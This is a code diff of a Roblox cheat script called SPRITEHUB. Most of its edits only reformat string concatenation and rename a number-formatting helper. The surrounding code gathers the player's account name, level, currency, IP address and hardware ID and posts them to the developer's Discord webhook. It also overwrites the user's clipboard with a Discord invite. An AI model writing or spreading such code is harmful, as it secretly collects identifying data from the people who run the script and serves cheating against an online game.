@@ -22,7 +22,7 @@ if game.gameId == 994732206 then
             elseif placeId == 7449423635 then
                 world_check = "3";
             end
-
+            
             game:GetService("Players").LocalPlayer.PlayerGui.Main.AwakeningToggler.Visible = true
             task.wait(0.25)
             for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Main.AwakeningToggler.TopContainer.Frame:GetChildren()) do
@@ -46,9 +46,9 @@ if game.gameId == 994732206 then
                 name = "Display Name: " .. game.Players.LocalPlayer.DisplayName .. "\n"
                 time = "Last: " .. os.date("!%H:%M", os.time() + 7 * 60 * 60) .. "\n"
                 world = "World: " .. world_check .. "\n"
-                level = "Level: " .. Number_Format(game.Players.LocalPlayer.Data.Level.Value) .. "\n"
-                beli = "Beli: " .. Number_Format(game.Players.LocalPlayer.Data.Beli.Value) .. "\n"
-                fragments = "Fragments: " .. Number_Format(game.Players.LocalPlayer.Data.Fragments.Value) .. "\n"
+                level = "Level: " .. Number_Comma(game.Players.LocalPlayer.Data.Level.Value) .. "\n"
+                beli = "Beli: " .. Number_Comma(game.Players.LocalPlayer.Data.Beli.Value) .. "\n"
+                fragments = "Fragments: " .. Number_Comma(game.Players.LocalPlayer.Data.Fragments.Value) .. "\n"
                 devilFruit = "Devil Fruit: " .. game.Players.LocalPlayer.Data.DevilFruit.Value .. "\n"
                 awaked = "Awake: " .. awake_list .. "\n"
                 race = "Race: " .. game.Players.LocalPlayer.Data.Race.Value .. "\n"
@@ -165,8 +165,8 @@ if game.gameId == 994732206 then
             
             spawn(function()
                 setclipboard("discord.gg/" .. Invite_Code)
-                RB_NOTIFICATION("SPRITEHUB - "..CHECK_GAME_NAME().." V."..Script_Version, "Welcome! " .. game.Players.LocalPlayer.DisplayName .. "\n(" .. CHECK_IP() .. ")", 10)
-                RB_NOTIFICATION("SPRITEHUB - "..CHECK_GAME_NAME().." V."..Script_Version, "Discord: discord.gg/" .. Invite_Code, 10)
+                RB_NOTIFICATION("SPRITEHUB - " .. CHECK_GAME_NAME() .. " V." .. Script_Version, "Welcome! " .. game.Players.LocalPlayer.DisplayName .. "\n(" .. CHECK_IP() .. ")", 10)
+                RB_NOTIFICATION("SPRITEHUB - " .. CHECK_GAME_NAME() .. " V." .. Script_Version, "Discord: discord.gg/" .. Invite_Code, 10)
                 
                 local Http_Webhook_Api
                 if syn then
@@ -181,7 +181,7 @@ if game.gameId == 994732206 then
                         ["Content-Type"] = "application/json"
                     },
                     Body = game:GetService("HttpService"):JSONEncode({
-                        ["username"] = "SPRITE HUB : "..CHECK_GAME_NAME().." V."..Script_Version,
+                        ["username"] = "SPRITE HUB : " .. CHECK_GAME_NAME() .. " V." .. Script_Version,
                         ["embeds"] = {
                             {
                                 ["author"] = {
@@ -190,7 +190,7 @@ if game.gameId == 994732206 then
                                     ["icon_url"] = "https://cdn.discordapp.com/attachments/1073316659848294503/1073665120716202085/SPRITE_DEV_JPG.png"
                                 },
                                 ["color"] = tonumber(0xffffff),
-                                ["title"] = "SPRITE HUB : "..CHECK_GAME_NAME().." V."..Script_Version,
+                                ["title"] = "SPRITE HUB : " .. CHECK_GAME_NAME() .. " V." .. Script_Version,
                                 ["description"] = "```" .. "\n" .. "Game: " .. CHECK_GAME_NAME() .. "\n" .. "Script Version: " .. Script_Version .. "\n" .. "Ip: " .. CHECK_IP() .. "\n" .. "Hwid: " .. CHECK_HWID() .. "```",
                                 ["url"] = "https://discord.gg/" .. Invite_Code,
                                 ["fields"] = {
@@ -367,7 +367,7 @@ if game.gameId == 994732206 then
                                 ["Content-Type"] = "application/json"
                             },
                             Body = game:GetService("HttpService"):JSONEncode({
-                                ["username"] = "SPRITE HUB : "..CHECK_GAME_NAME().." V."..Script_Version,
+                                ["username"] = "SPRITE HUB : " .. CHECK_GAME_NAME() .. " V." .. Script_Version,
                                 ["embeds"] = {
                                     {
                                         ["author"] = {
@@ -376,7 +376,7 @@ if game.gameId == 994732206 then
                                             ["icon_url"] = "https://cdn.discordapp.com/attachments/1073316659848294503/1073665120716202085/SPRITE_DEV_JPG.png"
                                         },
                                         ["color"] = tonumber(0xffffff),
-                                        ["title"] = "SPRITE HUB : "..CHECK_GAME_NAME().." V."..Script_Version,
+                                        ["title"] = "SPRITE HUB : " .. CHECK_GAME_NAME() .. " V." .. Script_Version,
                                         ["description"] = "```" .. "Name: " .. game.Players.LocalPlayer.Name .. "\n" .. "Nick Name: " .. game.Players.LocalPlayer.DisplayName .. "\n" .. "```",
                                         ["url"] = "https://discord.gg/" .. Invite_Code,
                                         ["fields"] = {
